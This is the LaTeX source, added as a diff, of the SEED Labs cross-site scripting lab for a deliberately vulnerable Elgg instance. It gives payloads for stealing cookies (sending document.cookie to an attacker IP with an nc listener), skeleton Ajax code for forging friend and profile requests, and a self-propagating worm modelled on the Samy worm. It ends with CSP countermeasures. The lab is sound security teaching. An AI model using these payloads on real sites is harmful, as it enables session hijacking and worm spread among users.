@@ -1,0 +1,655 @@
+\input{../../common-files/header}
+\input{../../common-files/copyright}
+
+
+\lhead{\bfseries SEED Labs -- Cross-Site Scripting Attack Lab}
+
+\begin{document}
+
+\begin{center}
+{\LARGE Cross-Site Scripting (XSS) Attack Lab}
+\vspace{0.1in}\\
+{\Large (Web Application: Elgg)}
+\end{center}
+
+\seedlabcopyright{2006 - 2020}
+
+\section{Overview}
+
+Cross-site scripting (XSS) is a type of vulnerability commonly found
+in web applications.  This vulnerability makes it possible for
+attackers to inject malicious code (e.g. JavaScript programs) into victim's
+web browser. Using this malicious code, attackers can steal a
+victim's credentials, such as session cookies.  The access control 
+policies~(i.e., the same origin policy) employed by browsers to protect
+those credentials can be bypassed by exploiting XSS vulnerabilities.
+
+To demonstrate what attackers can do by exploiting XSS
+vulnerabilities, we have set up a web application named 
+{\tt Elgg} in our pre-built Ubuntu VM image.
+{\tt Elgg} is a very popular open-source web application for
+social network, and it has implemented a number of countermeasures 
+to remedy the XSS threat. To demonstrate how XSS attacks work, we 
+have commented out these countermeasures in Elgg in our installation, 
+intentionally making Elgg vulnerable to XSS attacks.  
+Without the countermeasures, users 
+can post any arbitrary message, including JavaScript
+programs, to the user profiles.  
+
+In this lab, students need to exploit this vulnerability to 
+launch an XSS attack on the modified {\tt Elgg}, in a way that is 
+similar to what Samy Kamkar
+did to {\tt MySpace} in 2005 through the notorious Samy worm. 
+The ultimate goal of this attack is to spread an XSS worm among the users,
+such that whoever views an infected user profile will be infected,
+and whoever is infected will add you (i.e., the attacker) to 
+his/her friend list. This lab covers the following topics:
+
+\begin{itemize}[noitemsep]
+ \item Cross-Site Scripting attack
+ \item XSS worm and self-propagation 
+ \item Session cookies
+ \item HTTP GET and POST requests
+ \item JavaScript and Ajax
+ \item Content Security Policy (CSP) 
+\end{itemize}
+
+\vspace{0.1in}
+\newnote{This lab was revised on July 26, 2020.
+Task 7 (countermeasures) is redesigned. It is now 
+based on Content Security Policy (CSP).} 
+
+
+\paragraph{Readings.}
+Detailed coverage of the Cross-Site Scripting attack can be found in the following:
+
+\begin{itemize}
+\item Chapter 10 of the SEED Book, \seedbook
+\end{itemize}
+
+
+\paragraph{Lab environment.} \seedenvironment
+
+
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Lab Environment}
+
+This lab can only be conducted in our Ubuntu 16.04 VM, because of the configurations that we
+have performed to support this lab. We summarize these configurations in this 
+section. 
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{../Web_Common/Web_Elgg_Setup}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\paragraph{DNS Configuration.}
+We have configured the following URL needed for this lab. 
+The folder where the web application is installed and the URL to access this web application are
+described in the following:
+
+\begin{lstlisting}
+  URL: http://www.xsslabelgg.com
+  Folder: /var/www/XSS/Elgg/
+\end{lstlisting}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\newcommand{\urlorurls}{URL }
+\newcommand{\urlisorurlsare}{URL is }
+\input{../Web_Common/Web_DNS_Setup}
+\input{../Web_Common/Web_Apache_Setup}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Lab Tasks}
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Preparation: Getting Familiar with the \texttt{"HTTP Header Live"} tool}
+
+In this lab, we need to construct HTTP requests. To figure out 
+what an acceptable HTTP request in Elgg looks like, we need to 
+be able to capture and analyze HTTP requests. 
+We can use a Firefox add-on called \texttt{"HTTP Header Live"} for this
+purpose. Before you start working on this lab, you should 
+get familiar with this tool.
+Instructions on how to use this tool is given in the Guideline
+section~(\S~\ref{web:sec:httpheaderlive}).
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 1: Posting a Malicious Message to Display an Alert Window}
+
+The objective of this task is to embed a JavaScript program in your 
+{\tt Elgg} profile, such that when another user views your profile, 
+the JavaScript program will be executed and an alert window
+will be displayed. The following JavaScript program will display an alert window: 
+\begin{lstlisting}
+    <script>alert('XSS');</script> 
+\end{lstlisting}
+If you embed the above JavaScript code in your profile (e.g. in the brief
+description field), then any user who views your profile will see the alert window. 
+
+In this case, the JavaScript code is short enough to be typed into the 
+short description field. If you want to run a long JavaScript, but you are limited
+by the number of characters you can type in the form, you can store the 
+JavaScript program in a standalone file, save it with the .js extension, and 
+then refer to it using the {\tt src} attribute in the {\tt <script>} tag. 
+See the following example:
+\begin{lstlisting}
+    <script type="text/javascript" 
+            src="http://www.example.com/myscripts.js">
+    </script>
+\end{lstlisting}
+In the above example, the page will fetch the JavaScript program from
+\url{http://www.example.com}, which can be any web server.
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 2: Posting a Malicious Message to Display Cookies}
+
+The objective of this task is to embed a JavaScript program in your 
+{\tt Elgg} profile, such that when another user views your profile,
+the user's cookies will be displayed in the alert window.
+This can be done by adding some additional code to
+the JavaScript program in the previous task:
+\begin{lstlisting}
+     <script>alert(document.cookie);</script> 
+\end{lstlisting}
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 3: Stealing Cookies from the Victim's Machine}
+
+In the previous task, the malicious JavaScript code written by 
+the attacker can print out the
+user's cookies, but only the user can see the cookies, not the 
+attacker.  In this task, the attacker wants the JavaScript code 
+to send the cookies to himself/herself.
+To achieve this, the malicious JavaScript code needs to 
+send an HTTP request to the attacker, with the cookies appended to 
+the request.
+
+We can do this by having the malicious JavaScript insert an {\tt $<$img$>$} tag with
+its {\tt src} attribute set to the attacker's machine.  When the JavaScript inserts
+the {\tt img} tag, the browser tries to load the image from the URL in
+the {\tt src} field; this results in an HTTP GET request sent to the attacker's
+machine. The
+JavaScript given below sends the cookies to the port 5555 of the
+attacker's machine (with IP address {\tt 10.1.2.5}), where the attacker has a TCP server
+listening to the same port.  
+
+\begin{lstlisting}
+ <script>document.write('<img src=http://10.1.2.5:5555?c=' 
+                        + escape(document.cookie) + '   >'); 
+ </script> 
+\end{lstlisting}
+
+
+A commonly used program by attackers is \texttt{netcat} (or \texttt{nc}) , which, if running with
+the \texttt{"-l"} option, becomes a TCP server that listens for a connection on the specified
+port. This server program basically prints out whatever is sent by the client and sends to the
+client whatever is typed by the user running the server. Type the command below to listen on
+port \texttt{5555}:
+
+\begin{lstlisting}
+$ nc -l 5555 -v
+\end{lstlisting}
+
+\noindent The "{\tt -l}" option is used to specify that nc should listen for an incoming
+connection rather than initiate a connection to a remote host. The "{\tt -v}" option is used to
+have \texttt{nc} give more verbose output.
+
+
+The task can also be done with only one VM instead of two. For one VM, you should replace the
+attacker's IP address in the above script with {\tt 127.0.0.1}. Start a new terminal and then
+type the {\tt nc} command above.
+
+
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 4: Becoming the Victim's Friend}
+
+In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005
+(i.e. the Samy Worm). We will write an XSS worm that adds Samy as a friend to any other user
+that visits Samy's page. This worm does not self-propagate; in  task 6, we will make it
+self-propagating.
+
+In this task, we need to write a malicious JavaScript program that forges HTTP requests
+directly from the victim's browser, without the intervention of the attacker.  The objective of
+the attack is to add Samy as a friend to the victim. We have already created a user called Samy
+on the {\tt Elgg} server (the user name is {\tt samy}).
+
+
+To add a friend for the victim, we should first find out how a legitimate 
+user adds a friend in {\tt Elgg}.
+More specifically, we need to figure out what are sent to the server when a user 
+adds a friend. Firefox's \texttt{HTTP} inspection tool 
+can help us get the information. It can display the contents of any HTTP request message sent 
+from the browser.  From the contents, we can identify all
+the parameters in the request. Section~\ref{xss:sec:guidelines}
+provides guidelines on how to use the tool.
+
+
+Once we understand what the add-friend HTTP request look like, 
+we can write a Javascript program to send out the same HTTP request. We provide a skeleton
+JavaScript code that aids in completing the task.
+
+\begin{lstlisting}
+<script type="text/javascript">
+window.onload = function () {
+  var Ajax=null;
+
+  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;          (*@ \ding{192} @*)
+  var token="&__elgg_token="+elgg.security.token.__elgg_token; (*@ \ding{193} @*)
+
+  //Construct the HTTP request to add Samy as a friend.
+  var sendurl=...;  //FILL IN
+
+  //Create and send Ajax request to add friend
+  Ajax=new XMLHttpRequest();
+  Ajax.open("GET",sendurl,true);
+  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+  Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+  Ajax.send();
+} 
+</script>
+\end{lstlisting}
+
+
+The above code should be placed in the \texttt{"About Me"} field of Samy's profile page. 
+This field provides two editing modes: Editor mode (default) and Text mode. 
+The Editor mode adds extra HTML code to the text typed into the field, while
+the Text mode does not. Since we do not
+want any extra code added to our attacking code, the Text mode should be enabled before entering
+the above JavaScript code. This can be done by clicking on 
+\texttt{"Edit HTML"}, which can be found at the top right
+of the \texttt{"About Me"} text field.
+
+
+\paragraph{Questions.} Please answer the following questions:
+
+\begin{itemize}
+\item \textbf{Question 1:} Explain the purpose of Lines \ding{192} and \ding{193}, why 
+are they are needed?
+
+\item \textbf{Question 2:} If the \texttt{Elgg} application only provide 
+the Editor mode for the \texttt{"About Me"} field, i.e., you cannot 
+switch to the Text mode, can you still launch a successful attack? 
+\end{itemize}
+ 
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 5: Modifying the Victim's Profile}
+
+
+The objective of this task is to modify the victim's profile when the victim visits Samy's
+page.  We will write an XSS worm to complete the task. This worm does not self-propagate; in
+task 6, we will make it self-propagating.
+
+Similar to the previous task, we need to write a malicious JavaScript program that forges HTTP
+requests directly from the victim's browser, without the intervention of the attacker.  
+To modify profile, we should first find out how a legitimate 
+user edits or modifies his/her profile in {\tt Elgg}. More specifically, we need to figure out
+how the HTTP POST request is constructed to modify a user's profile.  
+We will use Firefox's {\tt HTTP} inspection tool. Once we understand 
+how the modify-profile HTTP POST request looks like, we can
+write a JavaScript program to send out the same HTTP request. We provide a skeleton JavaScript
+code that aids in completing the task.
+
+\begin{lstlisting}
+<script type="text/javascript">
+window.onload = function(){
+  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts 
+  //and Security Token __elgg_token
+  var userName=elgg.session.user.name;
+  var guid="&guid="+elgg.session.user.guid;
+  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+  var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+  //Construct the content of your url.
+  var content=...;     //FILL IN
+
+  var samyGuid=...;    //FILL IN
+  if(elgg.session.user.guid!=samyGuid)           (*@ \ding{192} @*)
+  {
+     //Create and send Ajax request to modify profile
+     var Ajax=null;
+     Ajax=new XMLHttpRequest();
+     Ajax.open("POST",sendurl,true);
+     Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+     Ajax.setRequestHeader("Content-Type",
+                           "application/x-www-form-urlencoded");
+     Ajax.send(content);
+  }
+}
+</script>
+\end{lstlisting}
+
+Similar to Task 4, the above code should be placed in the \texttt{"About Me"} field of Samy's
+profile page, and the Text mode should enabled before entering the above JavaScript code.
+
+
+\paragraph{Questions.} Please answer the following questions:
+
+\begin{itemize}
+\item \textbf{Question 3:} Why do we need Line \ding{192}? Remove this line, and repeat 
+your attack. Report and explain your observation.
+\end{itemize}
+ 
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 6: Writing a Self-Propagating XSS Worm}
+
+To become a real worm, the malicious JavaScript program should be able to propagate itself.
+Namely, whenever some people view an infected profile, 
+not only will their profiles be modified, the worm will also be 
+propagated to their profiles, further affecting others who view these newly infected profiles.
+This way, the more people view the infected profiles, the faster the worm can propagate. 
+This is exactly the same mechanism used by the Samy Worm: 
+within just 20 hours of its October 4, 2005 release, over one million users 
+were affected, making Samy one of the fastest spreading viruses of all time.
+The JavaScript code that can achieve this is called 
+a {\em self-propagating cross-site scripting worm}. In this task, you need to 
+implement such a worm, which not only modifies the victim's profile and adds the user
+``Samy'' as a friend, but also add a copy of the worm itself to the victim's profile, so the
+victim is turned into an attacker.
+
+
+To achieve self-propagation, when the malicious JavaScript modifies the victim's profile,
+it should copy itself to the victim's profile. There are several 
+approaches to achieve this, and we will discuss two common approaches.
+
+\paragraph{Link Approach:} If the worm is included using the {\tt src} attribute in the {\tt <script>} tag,
+writing self-propagating worms is much easier. 
+We have discussed the {\tt src} attribute in Task 1, and an example
+is given below. The worm can simply copy the following
+{\tt <script>} tag to the victim's profile, essentially
+infecting the profile with the same worm.
+
+\begin{lstlisting}
+<script type="text/javascript" src="http://example.com/xss_worm.js">
+</script>
+\end{lstlisting} 
+
+\paragraph{DOM Approach:} If the entire JavaScript program (i.e., the worm) is 
+    embedded in the infected profile, 
+    to propagate the worm to another profile, the worm code can use
+    DOM APIs to retrieve a copy of itself from the web page.
+    An example of using DOM APIs is given below. This code
+    gets a copy of itself, and displays it in an alert window:
+
+{\footnotesize
+\begin{lstlisting}
+<script id=worm>
+   var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; (*@ \ding{192} @*)
+   var jsCode = document.getElementById("worm").innerHTML;          (*@ \ding{193} @*)
+   var tailTag = "</" + "script>";                                  (*@ \ding{194} @*)
+   
+   var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); (*@ \ding{195} @*)
+      
+   alert(jsCode);
+</script>
+\end{lstlisting}
+}
+
+
+It should be noted that {\tt innerHTML} (line \ding{193}) only gives us the inside part of the
+code, not including the surrounding {\tt script} tags. We just need to add the beginning tag
+{\tt <script id="worm">} (line \ding{192}) and the ending tag {\tt </script>} (line \ding{194})
+to form an identical copy of the malicious code.
+
+When data are sent in HTTP POST requests with the {\tt Content-Type} set to {\tt
+application/x-www-\\form-urlencoded}, which is the type used in our code, the data should also
+be encoded. The encoding scheme is called \textit{URL encoding}, which replaces
+non-alphanumeric characters in the data with {\tt \%HH}, a percentage sign and two hexadecimal
+digits representing the ASCII code of the character. The {\tt encodeURICom\\ponent()} function
+in line \ding{195} is used to URL-encode a string.
+
+\paragraph{Note:} In this lab, you can try both Link and DOM approaches, but the DOM approach
+is required, because it is more challenging and it does not rely on external JavaScript code.
+
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Elgg's Countermeasures}
+
+
+This sub-section is only for information, and there is no specific task to do. 
+It shows how {\tt Elgg} defends against the XSS attack. 
+{\tt Elgg} does have built-in countermeasures, and
+we have deactivated and commented out them to make the
+attack work. Actually, {\tt Elgg} uses two countermeasures. 
+One is a custom built security plugin {\tt HTMLawed}, 
+which, on activation, validates the user input and removes the tags from the input.
+This specific plugin is registered to the {\tt “function filter\_tags”} in the
+\url{elgg/engine/lib/input.php} file. 
+
+
+To turn on the countermeasure, login to the application as admin, goto {\tt
+Account->administration} (top right of screen) $\rightarrow$ {\tt plugins} (on the right
+panel), and click on {\tt security and spam} under the filter options at the top of the page.
+You should find the {\tt HTMLawed} plugin below.  Click on {\tt Activate} to enable the
+countermeasure.
+
+
+In addition to the {\tt HTMLawed 1.9} security plugin in {\tt Elgg}, there is another built-in
+PHP method called {\tt “htmlspecialchars()”}, which is used to encode the special characters in
+user input, such as {\tt "<"} to {\tt “\&lt”}, {\tt ">"} to {\tt “\&gt”}, etc.
+Please go to \url{/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/} and
+find the function call {\tt “htmlspecialchars”} in {\tt text.php}, {\tt url.php}, {\tt
+dropdown.php} and {\tt email.php} files. Uncomment the corresponding {\tt "htmlspecialchars"}
+function calls in each file. 
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 7: Defeating XSS Attacks Using CSP}
+
+The fundamental problem of the XSS vulnerability is that HTML allows JavaScript code to be
+mixed with data. Therefore, to fix this fundamental problem, we need to separate code from
+data. There are two ways to include JavaScript code inside an HTML page, one is
+the inline approach, and the other is the link approach.
+The inline approach directly places code inside the page, while the
+link approach puts the code in an external file, and then link to it
+from inside the page.
+
+The inline approach is the culprit of the XSS vulnerability, because
+browsers do not know where the code originally comes from: is it from the trusted
+web server or from untrusted users? Without such knowledge, browsers
+do not know which code is safe to execute, and
+which one is dangerous.
+The link approach provides a very important piece of information to
+browsers, i.e., where
+the code comes from. Websites can then tell browsers which sources are
+trustworthy, so browsers know which piece of code is safe to execute.
+Although attackers can also use the link approach to
+include code in their input, they cannot place their code in
+those trustworthy places.
+
+How websites tell browsers which code source is trustworthy is achieved
+using a security mechanism called Content Security Policy (CSP). This
+mechanism is specifically designed to defeat XSS and ClickJacking attacks.
+It has become a standard, which is supported by most browsers nowadays.
+CSP not only restricts JavaScript code, it also restricts other page contents, such as
+limiting where pictures, audio, and video can come from, as well as restricting
+whether a page can be put inside an iframe or not (used for defeating ClickJacking
+attacks). Here, we will only focus on how to use CSP to defeat XSS attacks.
+
+
+\paragraph{Run a web server.} CSP is set by the web server. 
+Let us use a web page to see CSP in action.
+Although we can use the Apache server (already installed in our VM) to host the web page,
+we decide to write a simple HTTP server to do this job. The following Python program runs an
+HTTP server that listens to port \texttt{8000}. 
+Upon receiving a request, it loads a static file
+and return it to the client. In the response, 
+the server adds a CSP header, setting the policy on the 
+JavaScript code inside the page.
+
+
+\begin{lstlisting}[caption={A simple HTTP server \texttt{http\_server.py}}]
+#!/usr/bin/env python3
+
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import *
+
+class MyHTTPRequestHandler(BaseHTTPRequestHandler):
+  def do_GET(self):
+    o = urlparse(self.path)
+    f = open("." + o.path, 'rb')
+    self.send_response(200)
+    self.send_header('Content-Security-Policy',
+          "default-src 'self';"
+          "script-src 'self' *.example68.com:8000 'nonce-1rA2345' ")
+    self.send_header('Content-type', 'text/html')
+    self.end_headers()
+    self.wfile.write(f.read())
+    f.close()
+
+httpd = HTTPServer(('127.0.0.1', 8000), MyHTTPRequestHandler)
+httpd.serve_forever()
+\end{lstlisting}
+ 
+
+Please download the zip file \texttt{csp.zip} from the lab's website,
+unzip it, and then enter the \texttt{csp} folder. Make 
+\texttt{http\_server.py} executable, and then run this 
+server program inside the \texttt{csp} folder.  
+
+
+\paragraph{The web page for the experiment.}
+To see how the CSP policies work,
+we wrote the following HTML page, which contains six areas, \texttt{area1} to \texttt{area6}.
+Initially, each area displays \texttt{"Failed"}. The page
+also includes six pieces of JavaScript code, each trying to
+write \texttt{"OK"} to its corresponding area.  If we can see
+\texttt{OK} in an area, that means, the JavaScript code corresponding
+to that area has been executed successfully; otherwise, we would see
+\texttt{Failed}.
+
+
+\begin{lstlisting}[caption={The experiment web page \texttt{csptest.html}}]
+<html>
+<h2 >CSP Test</h2>
+<p>1. Inline: Correct Nonce: <span id='area1'>Failed</span></p>
+<p>2. Inline: Wrong Nonce: <span id='area2'>Failed</span></p>
+<p>3. Inline: No Nonce: <span id='area3'>Failed</span></p>
+<p>4. From self: <span id='area4'>Failed</span></p>
+<p>5. From example68.com: <span id='area5'>Failed</span></p>
+<p>6. From example79.com: <span id='area6'>Failed</span></p>
+
+<script type="text/javascript" nonce="1rA2345">
+document.getElementById('area1').innerHTML = "OK";
+</script>
+
+<script type="text/javascript" nonce="2rB3333">
+document.getElementById('area2').innerHTML = "OK";
+</script>
+
+<script type="text/javascript">
+document.getElementById('area3').innerHTML = "OK";
+</script>
+
+<script src="script1.js"> </script>
+<script src="http://www.example68.com:8000/script2.js"> </script>
+<script src="http://www.example79.com:8000/script3.js"> </script>
+
+<button onclick="alert('hello')">Click me</button>
+</html>
+\end{lstlisting}
+ 
+
+
+\paragraph{Set up DNS.}
+We need to set up the DNS entry, so the above web server can be accessed 
+via three different URLs. Add the following three entries
+to the \texttt{/etc/hosts} file. You need to use the root privilege to 
+change this file (using \texttt{sudo}).
+
+\begin{lstlisting}
+127.0.0.1       www.example32.com
+127.0.0.1       www.example68.com
+127.0.0.1       www.example79.com
+\end{lstlisting}
+
+
+
+\paragraph{Lab tasks.} Please complete the following tasks. 
+
+\begin{enumerate}
+\item Point your browser to the following URLs. Describe and explain your observation.
+
+\begin{lstlisting}
+  http://www.example32.com:8000/csptest.html
+  http://www.example68.com:8000/csptest.html
+  http://www.example79.com:8000/csptest.html
+\end{lstlisting}
+
+\item Change the server program (not the web page), so 
+Fields 1, 2, 4, 5, and 6 all display \texttt{OK}. Please include your code 
+in the lab report.
+\end{enumerate}
+ 
+
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Guidelines}
+\label{xss:sec:guidelines}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{../Web_Common/Web_Dev_Tools}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Submission}
+
+\seedsubmission
+
+
+\end{document}
